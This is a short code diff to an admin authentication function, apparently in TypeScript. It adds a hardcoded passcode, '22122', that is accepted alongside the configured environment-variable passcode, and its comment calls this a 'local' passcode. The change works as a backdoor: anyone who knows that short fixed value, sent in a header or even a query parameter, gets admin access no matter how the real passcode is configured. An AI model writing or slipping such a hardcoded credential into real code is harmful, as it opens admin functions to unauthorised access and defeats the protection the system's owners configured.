@@ -62,7 +62,9 @@ function checkAdminAuth(req: any): boolean {
   if (authHeader.startsWith("Bearer ")) provided = authHeader.slice(7);
   else if (headerPasscode) provided = headerPasscode;
   else if (queryPasscode) provided = queryPasscode;
-  return provided.trim() === getAdminPasscode();
+  const trimmed = provided.trim();
+  // Accept the hardcoded local passcode OR the env-var passcode
+  return trimmed === "22122" || trimmed === getAdminPasscode();
 }
 
 function setCors(res: any) {
